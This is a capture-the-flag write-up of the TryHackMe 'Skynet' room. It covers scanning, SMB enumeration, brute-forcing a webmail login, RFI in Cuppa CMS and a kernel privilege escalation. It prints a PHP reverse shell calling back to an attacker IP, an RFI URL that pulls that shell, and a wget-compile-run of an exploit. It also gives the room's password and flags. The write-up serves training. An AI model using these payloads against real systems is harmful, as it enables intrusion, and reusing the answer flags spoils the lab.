# Lab Report - Skynet


# Overview 
- **Category**: Web
- **Difficulty**: Easy
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/skynet

## Challenge Description 
>**A vulnerable Terminator themed Linux machine.**

## Resolution Summary 
**We discovered available services with an `Nmap` scan, revealing HTTP, SMB, and several mail services. We enumerated SMB shares with `enum4linux`, finding a password wordlist and a username (`milesdyson`) in the anonymous share. We brute-forced the `SquirrelMail` login with `Burp Suite Intruder`, retrieved the SMB credentials from the mailbox, and uncovered a hidden directory. Further enumeration with `Gobuster` led us to a `Cuppa CMS` administrator portal vulnerable to RFI (`CVE` not assigned), which we exploited to obtain a reverse shell. Finally, we escalated privileges to root by compiling and executing a local kernel exploit (`CVE-2017-1000112`).**

# Information Gathering 
- **Having the IP address of the target machine, we begun with an `Nmap` scan in order to reveal available services, and we added the `-sV` flag to scan for services' version which can reveal low-hanging fruit (version exploits).**
```bash
sudo nmap -sV 10.10.10.182
```
	-Note: Adding the -p- flag provided the same results.

- **The previous scan provided the following results:**
```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- **We begun with inspecting the web application.** 
## HTTP(80)
- **The web page offered a single feature, which was a search bar.**
- **We started by inspecting the Source Page, and we found that the search requests were submitted through a POST request.** 
- **Meanwhile, we already ran in the background a `Gobuster` scan to look for hidden directories:** 
```bash
gobuster dir -u 10.10.10.182 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 64
```

- **The scan provided the following results.**
```bash
/admin                (Status: 301) [Size: 312] [--> http://10.10.10.182/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.182/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.182/js/]
/config               (Status: 301) [Size: 313] [--> http://10.10.10.182/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.10.182/ai/]
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.10.182/squirrelmail/]
```

- **However, all most pages' access is restricted. Hence, we thought about investigating the POST request with `Burp Suite`.**
- **We did not find any noticeable feature, we could have performed a fuzzing attack but for now we will focus on the other available services in order to find any hints.**

- **But, when inspecting the `/squirrelmail` directory, we stumbled upon a login page, we also looked at the Source Page and found the software's version `SquirrelMail version 1.4.23`.** 
## SMB(139,445)
- **We shifted our focus to the SMB service.** 
- **We started by enumerating SMB shares with `enum4linux`:**
```bash
enum4linux -S 10.10.10.182
```

- **We could have also used `smbclient` to do so:**
```bash
smclient -L //10.10.10.182 -N
```

- **We uncovered the following shares:**
```bash
//10.10.10.182/print$   Mapping: DENIED Listing: N/A Writing: N/A        //10.10.10.182/anonymous        Mapping: OK Listing: OK Writing: N/A
//10.10.10.182/milesdyson       Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.182/IPC$     Mapping: N/A Listing: N/A Writing: N/A
```

- **From the results, we focused on the `anonymous` share since it did not require authentication and we could list its content.** 
- **We connected to the share by using:**
```bash
smbclient //10.10.10.182/anonymous
#Then we pressed enter when we were asked for a password
```

- **Once connected, we used the `help` command to list available commands on the server, and we found an interesting text file:** 
```bash
ls
#We found a file named attention.txt
more attention.txt
#Results
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

- **We discovered that there was a many passwords that were changed, we kept this information in mind, as well as the author's name.**

- **Furthermore, we also found a directory named `logs` that contained 3 text files.**
```bash
recurse 
ls 
#Results
\logs
  log1.txt          
  log2.txt                         
  log3.txt 
```

- **We proceeded to upload them locally before any inspection.**
- **The only file containing any data was the `log1.txt`, which looked like a password wordlist.**

- **We also enumerated SMB users and password policies. this could prove to be useful since we could eliminate candidates from wordlists and attempt only password brute-forcing.** 
```bash
#Users
milesdyson
nobody
#Password Policies
Minimum password length: 5
```

- **Since we got a wordlist and a username from the SMB shares, we can try and test it against the login page found previously.**

## HTTP (80)
- **We came back to the login web page. We loaded `Burp Suite`, intercepted a login request, sent it to intruder, added the payload on the `secretkey` filed and used the `log1.txt` wordlist. We filtered out successful attempts by status code (302 here, we could have also proceeded by response length).** 

- **We used the username we found `milesdyson` and found a matching password  
	- password: **`cyborg007haloterminator`.**

- **We navigated through the emails and found the SMB share's `milesdyson` password, which allowed (by the same means employed for `log1.txt` file) to find a flag:**
	- hidden directory: **`/45kra24zxs28v3yd`.**

- **Next, we investigated this newly discovered directory. We started by running another `GoBuster` scan :** 
```bash
gobuster dir -u http://10.10.10.182/45kra24zxs28v3yd/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -k -t 64
```

# Exploitation 
- **We found the `/administrator` directory which was yet another login portal. We attempted to spray our previous credentials here, but it did not work.**

- **We inspected the Source page and found that there is a feature to reset password but the option is not visible. We changed that by using the Developer's web tool and typed in the console `ShowPanel('forget')`.** 

- **Upon further research on the CMS, we found that it can be vulnerable to Local/Remote File Inclusion. We tested the following payload, which proved to be successful:** 
```bash
http://10.10.10.182/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

- **Hence, we tried to upload and execute a shell:** 
- **First, we used a PHP webshell:** 
```bash
<?php
$s=fsockopen("10.11.139.102",1234, $e, $es, 5);
if(!$s){ echo "no sock\n"; exit; }
$descriptors = array(0 => $s, 1 => $s, 2 => $s);
proc_open('/bin/sh -i', $descriptors, $pipes);
?>
```

- **Then, we hosted a python HTTP server to make the shell available:**
```bash
python3 -m http.server 8000
```

- **Next, we exploit the RFI vulnerability by connecting to the following URL and obtained a shell.** 
```bash
10.10.10.182/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.139.102:8000/shell.php?
```

# Privilege Escalation 
- **Once we had our shell, we attempted to upgrade it using the following commands:** 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
#Press Ctrl + Z to background the shell session
stty raw -echo; fg
```

- **We started by looking for a potential kernel version exploit:**
```bash
uname -a 
#Result
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

- **After a quick search on [exploit-db](https://www.exploit-db.com/), we found the `CVE-2017-1000112` exploit available.**
- **We downloaded it, and grabbed it on the target server through our python HTTP server we deployed earlier:**
```bash
#On target
wget http://10.11.139.102:8000/43418.c
```

- **After that, we compiled it on the target machine an executed it, which resulted into a root shell:**
```bash
gcc 43418.c -o pwn
./pwn
```

- **We completed the room by reading the last flag:**
	- root.txt: **`3f0372db24753accc7179a282cd6a949`**.

# Trophy 
---
**User.txt → `7ce5c2109a40f958099283600a9ae807`** 

**Root.txt → `3f0372db24753accc7179a282cd6a949`**


